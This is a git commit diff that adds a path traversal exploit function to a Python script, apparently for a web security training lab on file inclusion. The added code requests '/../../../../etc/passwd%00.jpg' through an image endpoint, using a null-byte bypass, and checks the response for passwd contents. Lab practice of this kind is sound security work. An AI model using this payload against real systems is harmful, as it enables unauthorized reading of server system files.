bba2bf6e262e6d1ccef97dfe7a3e43a221217d8f
Jozenartes <jozenarts12@gmail.com>
2025-08-08 08:13:43 +0100

    added exploit function

--- 06-File Inclusion/Lab-06/Directory-traveseral-lab06.py
+++ 06-File Inclusion/Lab-06/Directory-traveseral-lab06.py
@@ -5,6 +5,14 @@ urllib3.disable_warnings(urllib3.exceptions.SecurityWarning)
 
 proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 
+def path_traversal_exploit(url):
+    image_path = url + 'image?filename=/../../../../etc/passwd%00.jpg'
+    r = requests.get(image_path,verify=False,proxies=proxies)
+    if 'uucp:x' in r.text:
+        print('[+] Exploit Successful!')
+    else:
+        print('[-] Exploit Unsuccessful!')
+
 def main():
     if len(sys.argv) != 2:
         print('[-] Oops')
@@ -14,6 +22,7 @@ def main():
 
     url = sys.argv[1]
     print('[+] Exploiting Path traversal vulnerability')
+    path_traversal_exploit(url)
 
 if __name__ == '__main__':
     main()
